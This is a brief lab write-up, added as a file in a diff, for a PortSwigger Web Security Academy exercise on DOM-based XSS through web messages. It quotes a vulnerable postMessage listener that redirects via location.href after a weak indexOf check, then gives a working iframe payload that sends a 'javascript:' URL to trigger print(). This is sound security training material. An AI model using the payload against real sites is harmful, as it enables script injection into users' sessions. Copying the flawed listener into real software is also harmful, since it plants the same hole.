@@ -1,0 +1,30 @@
+Lab: DOM XSS using web messages and a JavaScript URL
+
+
+the following script is seen in the request to /
+
+                   <script>
+                        window.addEventListener('message', function(e) {
+                            var url = e.data;
+                            if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
+                                location.href = url;
+                            }
+                        }, false);
+                    </script>
+
+this script takes a message and redirects the user to the url.
+
+what the website does incorrectly in this script is validate the http: and the https: strings with the indexof() method.
+
+
+i used the following payload in the exploit server:
+<iframe src="https://0aea0033049efd688092c1bd005f0038.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//https:','*')">
+
+
+
+This script sends a web message containing an arbitrary JavaScript payload, along with the string "https:". 
+The second argument specifies that any targetOrigin is allowed for the web message.
+
+
+When the iframe loads, the postMessage() method sends the JavaScript payload to the main page. 
+The event listener spots the "http:" string and proceeds to send the payload to the location.href sink, where the print() function is called.
